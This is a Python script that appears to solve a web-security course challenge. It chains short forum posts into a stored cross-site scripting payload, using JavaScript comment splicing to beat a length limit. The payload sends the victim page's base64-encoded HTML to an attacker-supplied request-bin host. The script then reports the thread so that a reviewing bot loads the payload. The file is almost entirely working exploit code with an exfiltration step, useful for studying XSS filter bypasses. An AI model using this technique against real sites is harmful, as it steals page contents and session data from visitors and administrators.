import requests
import sys

if(len(sys.argv) != 3):
	print('Usage: python3 zad1.py <request_bin_endpoint> <thread_hash>\n(first create thread on https://bskweb2020.0x04.net/ to obtain the hash)')
	exit()

url = 'https://bskweb2020.0x04.net/thread/' + sys.argv[2]
chunk_size = 9 # 13 - len("/**/")
request_bin_endpoint = sys.argv[1]
if(request_bin_endpoint[-1] != '/'):
	request_bin_endpoint += '/'

def post_start(url = url):
	data = {
  		'content': '<script>/*'
	}
	response = requests.post(url, data=data)

def post_end(url = url):
	data = {
  		'content': '*/</script>'
	}
	response = requests.post(url, data=data)

def post_inter(content, url=url):
	if(len(content) > chunk_size): print(f'content {content} too long')
	data = { 'content': '*/' + content + '/*'}
	response = requests.post(url, data=data)

def report():
	report_headers = {
   	'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0',
   	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://bskweb2020.0x04.net',
    'Connection': 'keep-alive',
    'Referer': 'https://bskweb2020.0x04.net/thread/' + sys.argv[2],
    'Upgrade-Insecure-Requests': '1',
	}
	response = requests.post('https://bskweb2020.0x04.net/report_thread/' + sys.argv[2], headers=report_headers)


def request_bin(*sliced):
	post_start()
	for s in sliced:
		post_inter(s)
	post_end()


def cut_string(str, chunk_len): # into chunk_len-length pieces
	res = ['"' + str[i:i+chunk_len] + '"' for i in range(0, len(str), chunk_len)]
	return list(map(lambda chunk: chunk + '+', res[:-1])) + res[-1:]


pieces = ['location', '=']
pieces += cut_string(request_bin_endpoint, chunk_size-3)
pieces += ['+btoa(', 'unescape(', 'encodeURI']
pieces += ['(', 'document', '.body.', 'outerHTML']
pieces += [')))']

request_bin(*pieces)
report()